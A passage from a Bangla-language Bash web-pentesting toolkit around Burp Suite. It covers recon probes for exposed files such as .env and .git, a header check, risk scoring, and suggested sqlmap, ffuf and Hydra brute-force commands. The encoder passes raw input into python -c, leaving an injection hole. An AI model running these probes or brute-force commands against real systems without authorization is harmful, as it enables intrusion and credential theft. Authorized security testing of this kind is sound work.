        echo -e "  ${GREEN}$(python3 -c "import urllib.parse; t=urllib.parse.quote('$input_text', safe=''); print(urllib.parse.quote(t, safe=''))")${NC}"
        echo ""
        echo -e "  ${WHITE}Base64 Encoded:${NC}"
        echo -e "  ${GREEN}$(echo -n "$input_text" | base64)${NC}"
        echo ""
        echo -e "  ${WHITE}HTML Encoded:${NC}"
        echo -e "  ${GREEN}$(python3 -c "import html; print(html.escape('$input_text'))")${NC}"
        echo ""
        echo -e "  ${WHITE}Hex Encoded:${NC}"
        echo -e "  ${GREEN}$(echo -n "$input_text" | xxd -p | tr -d '\n')${NC}"
        echo ""
        echo -e "  ${WHITE}Unicode Escaped:${NC}"
        echo -e "  ${GREEN}$(python3 -c "print(''.join(f'\\\\u{ord(c):04x}' for c in '$input_text'))")${NC}"
    fi

    echo -e "${CYAN}💡 Burp Decoder tab এ আরো encoding options পাবেন${NC}"
    echo ""
}

# ================================================================
# MODE 35 — ALL IN ONE WEB RECON
# ================================================================
mode_allinone() {
    get_proxy_config

    echo ""
    echo -e "${RED}${BOLD}[*] All-in-One Web Recon শুরু হচ্ছে...${NC}"
    echo ""

    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/allinone_${ts}.txt"

    echo -e "${CYAN}━━━ 1. Pre-Scan Recon ━━━${NC}"
    pre_scan_recon "$TARGET" 2>&1 | tee -a "$out"

    echo -e "${CYAN}━━━ 2. Security Headers Check ━━━${NC}"
    local headers
    headers=$(curl -s -I --proxy "http://$BURP_PROXY_HOST:$BURP_PROXY_PORT" -k --max-time 10 "$TARGET_URL" 2>/dev/null)
    local missing_headers=()
    for h in "Strict-Transport-Security" "Content-Security-Policy" "X-Frame-Options" "X-Content-Type-Options"; do
        echo "$headers" | grep -qi "^$h:" && \
            echo -e "  ${GREEN}[✓] $h${NC}" || \
            { echo -e "  ${RED}[✗] $h MISSING${NC}"; missing_headers+=("$h"); }
    done
    echo ""

    echo -e "${CYAN}━━━ 3. Sensitive Path Discovery ━━━${NC}"
    local found_paths=()
    for path in "/robots.txt" "/.git/HEAD" "/.env" "/admin/" "/phpinfo.php" "/api/" "/swagger.json" "/backup.zip"; do
        local code
        code=$(curl -s -o /dev/null -w "%{http_code}" \
            --proxy "http://$BURP_PROXY_HOST:$BURP_PROXY_PORT" \
            -k --max-time 5 "${TARGET_URL}${path}" 2>/dev/null)
        if [ "$code" == "200" ]; then
            echo -e "  ${RED}[✓] FOUND: ${TARGET_URL}${path}${NC}"
            found_paths+=("$path")
            echo "FOUND: ${TARGET_URL}${path}" >> "$out"
        fi
    done
    [ ${#found_paths[@]} -eq 0 ] && echo -e "  ${GREEN}[✓] কোনো sensitive path পাওয়া যায়নি।${NC}"
    echo ""

    echo -e "${CYAN}━━━ 4. SSL/HTTPS Check ━━━${NC}"
    local http_code
    http_code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "http://$TARGET" 2>/dev/null)
    [ "$http_code" == "301" ] || [ "$http_code" == "302" ] && \
        echo -e "  ${GREEN}[✓] HTTP → HTTPS redirect${NC}" || \
        echo -e "  ${RED}[!] HTTPS redirect নেই${NC}"

    echo ""
    echo -e "${CYAN}━━━ 5. Summary ━━━${NC}"
    bangla_analysis_web "$out"
    suggest_next_tool_web "$out"

    echo ""
    echo -e "${GREEN}[✓] Full report: $out${NC}"
    echo "$(date) | All-in-One | $TARGET_URL | $out" >> "$HISTORY_FILE"
}

# ================================================================
# BANGLA ANALYSIS — WEB
# ================================================================
bangla_analysis_web() {
    local outfile=$1

    echo ""
    echo -e "${MAGENTA}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}${BOLD}║             বাংলায় ফলাফল বিশ্লেষণ                                 ║${NC}"
    echo -e "${MAGENTA}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    local critical=0 high=0 medium=0

    # Check for common vulnerabilities in output
    if grep -qi "REFLECTED\|XSS\|alert(1)" "$outfile" 2>/dev/null; then
        critical=$((critical+1))
        echo -e "  ${RED}${BOLD}🚨 XSS পাওয়া গেছে!${NC}"
        echo -e "     ${WHITE}→ Cross-Site Scripting vulnerability। Attacker browser এ script চালাতে পারবে।${NC}"
        echo -e "     ${RED}→ ঝুঁকি: HIGH/CRITICAL${NC}"; echo ""
    fi

    if grep -qi "FOUND.*admin\|FOUND.*login\|FOUND.*panel" "$outfile" 2>/dev/null; then
        high=$((high+1))
        echo -e "  ${YELLOW}${BOLD}⚠ Admin Panel পাওয়া গেছে!${NC}"
        echo -e "     ${WHITE}→ Exposed admin panel brute force বা default login এর ঝুঁকি তৈরি করে।${NC}"
        echo -e "     ${YELLOW}→ ঝুঁকি: HIGH${NC}"; echo ""
    fi

    if grep -qi "FOUND.*\.env\|FOUND.*\.git\|FOUND.*config\|FOUND.*backup" "$outfile" 2>/dev/null; then
        critical=$((critical+1))
        echo -e "  ${RED}${BOLD}🚨 Sensitive File Exposed!${NC}"
        echo -e "     ${WHITE}→ .env, .git, config, backup file publicly accessible!${NC}"
        echo -e "     ${RED}→ ঝুঁকি: CRITICAL — Credentials বা source code leak।${NC}"; echo ""
    fi

    if grep -qi "CSRF.*NOT FOUND\|CSRF token: NOT" "$outfile" 2>/dev/null; then
        high=$((high+1))
        echo -e "  ${YELLOW}${BOLD}⚠ CSRF Token নেই!${NC}"
        echo -e "     ${WHITE}→ Cross-Site Request Forgery attack সম্ভব।${NC}"
        echo -e "     ${YELLOW}→ ঝুঁকি: HIGH${NC}"; echo ""
    fi

    if grep -qi "MISSING.*X-Frame\|X-Frame-Options MISSING" "$outfile" 2>/dev/null; then
        medium=$((medium+1))
        echo -e "  ${CYAN}${BOLD}ℹ Clickjacking Risk${NC}"
        echo -e "     ${WHITE}→ X-Frame-Options নেই — iframe এ embed করা সম্ভব।${NC}"
        echo -e "     ${CYAN}→ ঝুঁকি: MEDIUM${NC}"; echo ""
    fi

    # Risk summary
    echo -e "  ${CYAN}${BOLD}━━━ সামগ্রিক ঝুঁকি মূল্যায়ন ━━━${NC}"
    echo -e "  ${RED}   Critical : $critical টি${NC}"
    echo -e "  ${YELLOW}   High     : $high টি${NC}"
    echo -e "  ${CYAN}   Medium   : $medium টি${NC}"
    echo ""

    if   [ "$critical" -gt 0 ]; then
        echo -e "  ${RED}${BOLD}  সার্বিক ঝুঁকি : ██████████ CRITICAL — এখনই পদক্ষেপ নিন!${NC}"
    elif [ "$high" -gt 0 ]; then
        echo -e "  ${YELLOW}${BOLD}  সার্বিক ঝুঁকি : ███████░░░ HIGH — দ্রুত patch করুন।${NC}"
    elif [ "$medium" -gt 0 ]; then
        echo -e "  ${CYAN}  সার্বিক ঝুঁকি : █████░░░░░ MEDIUM — মনোযোগ দিন।${NC}"
    else
        echo -e "  ${GREEN}  সার্বিক ঝুঁকি : ███░░░░░░░ LOW — স্পষ্ট vulnerability নেই।${NC}"
    fi
    echo ""
}

# ================================================================
# NEXT TOOL SUGGESTION — WEB
# ================================================================
suggest_next_tool_web() {
    local outfile=$1

    echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}${BOLD}║             পরবর্তী Tool এর সাজেশন                                 ║${NC}"
    echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    if grep -qi "FOUND\|sql\|xss\|admin\|login" "$outfile" 2>/dev/null; then
        echo -e "  ${GREEN}${BOLD}💉 SQLmap${NC} — SQL Injection Deep Test"
        echo -e "     ${CYAN}কমান্ড: sqlmap -u '$TARGET_URL?id=1' --dbs --batch --level=3${NC}"; echo ""

        echo -e "  ${MAGENTA}${BOLD}🔍 Gobuster / FFUF${NC} — Directory & Parameter Fuzzing"
        echo -e "     ${CYAN}কমান্ড: ffuf -u '$TARGET_URL/FUZZ' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt${NC}"; echo ""

        echo -e "  ${YELLOW}${BOLD}🔑 Hydra${NC} — Login Brute Force"
        echo -e "     ${CYAN}কমান্ড: hydra -L users.txt -P rockyou.txt $TARGET http-post-form '/login:u=^USER^&p=^PASS^:F=invalid'${NC}"; echo ""
    fi

    echo -e "  ${WHITE}${BOLD}🌐 Nikto${NC} — Full Web Vulnerability Scan"
    echo -e "     ${CYAN}কমান্ড: nikto -h $TARGET_URL -useproxy http://127.0.0.1:8080${NC}"; echo ""

    echo -e "  ${MAGENTA}${BOLD}🔍 Nuclei${NC} — Template-based Vulnerability Scan"
    echo -e "     ${CYAN}কমান্ড: nuclei -u $TARGET_URL -t . -severity medium,high,critical${NC}"; echo ""

    echo -e "  ${CYAN}${BOLD}🔒 SSLScan${NC} — SSL/TLS Deep Analysis"
    echo -e "     ${CYAN}কমান্ড: sslscan $TARGET${NC}"; echo ""
}

# ================================================================
# SAVE RESULTS
# ================================================================
save_results() {
    local content=$1
    local label=$2

    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/${label}_${ts}.txt"

    echo "$content" > "$out"
    echo -e "${GREEN}[✓] Saved: $out${NC}"
    echo "$(date) | $label | $TARGET_URL | $out" >> "$HISTORY_FILE"
}

# ================================================================
# MAIN LOOP
# ================================================================
main() {
    show_banner
    check_deps

    while true; do
        get_target
        pre_scan_recon "$TARGET"

        show_menu
        read -p "$(echo -e ${YELLOW}"[?] Option select করুন [0-35]: "${NC})" choice

        if [[ "$choice" == "0" ]]; then
            echo ""
            echo -e "${GREEN}${BOLD} Goodbye! Stay legal & ethical! 🛡️${NC}"
            echo ""
            exit 0
        fi

        case $choice in
            1)  mode_launch_burp ;;
            2)  mode_headless ;;
            3)  mode_proxy_guide ;;
            4)  mode_proxy_test ;;
            5)  mode_ca_cert_guide ;;
            6)  mode_upstream_proxy ;;
            7)  mode_intercept_curl ;;
            8)  mode_xss_payloads ;;
            9)  mode_sqli_payloads ;;
            10) mode_ssrf_payloads ;;
            11) mode_idor_helper ;;
            12) mode_csrf_check ;;
            13) mode_file_upload_bypass ;;
            14) mode_jwt_analyzer ;;
            15) mode_open_redirect ;;
            16) mode_cmd_injection ;;
            17) mode_path_traversal ;;
            18) mode_xxe_payloads ;;
            19) mode_ssti_payloads ;;
            20) mode_intruder_sniper ;;
            21) mode_intruder_clusterbomb ;;
            22) mode_intruder_payload_gen ;;
            23) mode_brute_login ;;
            24) mode_http_request_builder ;;
            25) mode_active_scan ;;
            26) mode_spider_guide ;;
            27) mode_scope_config ;;
            28) mode_ssl_strip ;;
            29) mode_cert_info ;;
            30) mode_security_headers ;;
            31) mode_vuln_report ;;
            32) mode_extensions ;;
            33) mode_waf_bypass ;;
            34) mode_encoder ;;
            35) mode_allinone ;;
            *)  echo -e "${RED}[!] ভুল অপশন।${NC}" ;;
        esac

        echo ""
        read -p "$(echo -e ${YELLOW}"[?] আরেকটি test করবেন? (y/n): "${NC})" again
        [[ ! "$again" =~ ^[Yy]$ ]] && {
            echo ""
            echo -e "${GREEN}${BOLD} Goodbye! Stay legal & ethical! 🛡️${NC}"
            echo ""
            exit 0
        }
        show_banner
    done
}

main
